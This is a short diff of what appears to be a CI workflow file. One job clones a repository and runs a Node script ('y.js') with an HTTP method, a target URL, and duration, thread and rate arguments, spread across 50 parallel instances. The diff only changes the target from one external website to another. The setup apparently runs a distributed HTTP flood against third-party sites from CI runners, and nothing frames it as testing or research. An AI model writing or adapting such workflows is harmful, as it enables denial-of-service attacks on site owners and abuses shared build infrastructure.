@@ -45,7 +45,7 @@ jobs:
         run: |
           git clone https://github.com/vrbrh921-glitch/Fc.git
           cd Fc
-          node y.js GET https://silent.multipanel.xyz/register.php 300 4 100 --full --debug 
+          node y.js GET https://ztraxonline.store/PANEL/public/connect 300 4 100 --full --debug 
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 50
